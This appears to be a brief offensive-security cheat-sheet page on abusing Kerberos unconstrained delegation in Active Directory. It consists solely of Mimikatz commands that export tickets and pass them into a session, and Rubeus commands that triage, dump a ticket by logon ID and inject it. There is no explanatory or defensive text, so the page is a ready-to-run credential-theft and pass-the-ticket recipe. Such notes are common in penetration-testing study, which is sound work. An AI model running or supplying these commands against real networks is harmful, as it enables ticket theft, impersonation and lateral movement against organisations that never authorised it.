---
coverY: 0
---

# 🟢 Unconstrained Delegation

### Unconstrained Delegation with MimiKatz

```
sekurlsa::tickets /export
kerberos::ptt c:\path\to\ticket.kirbi
```

### Unconstrained Delegation with Rubeus

```
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x5379f2 /nowrap
.\Rubeus.exe ptt /ticket:RFSSCC[...]
```
